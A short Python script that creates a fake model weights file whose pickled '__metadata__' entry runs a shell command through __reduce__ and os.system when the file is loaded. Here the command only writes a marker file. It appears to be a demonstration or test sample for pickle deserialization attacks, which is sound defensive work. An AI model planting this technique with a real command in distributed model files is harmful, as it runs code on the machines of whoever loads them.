import pickle, os

class Payload:
    """Object that hijacks reconstruction via __reduce__."""
    def __reduce__(self):
        # deliberately harmless: just writes a marker file
        return (os.system, ('echo EXECUTED_ON_LOAD > PWNED.txt',))

# mimics a model state_dict: normal tensors + one extra
fake_state_dict = {
    "layers.0.attention.query.weight": [0.12, -0.44, 0.98],
    "layers.0.attention.key.weight":   [0.31, 0.07, -0.22],
    "__metadata__": Payload(),          # <- the intruder
}

with open("suspicious_model.bin", "wb") as f:
    pickle.dump(fake_state_dict, f)

print("file created: suspicious_model.bin")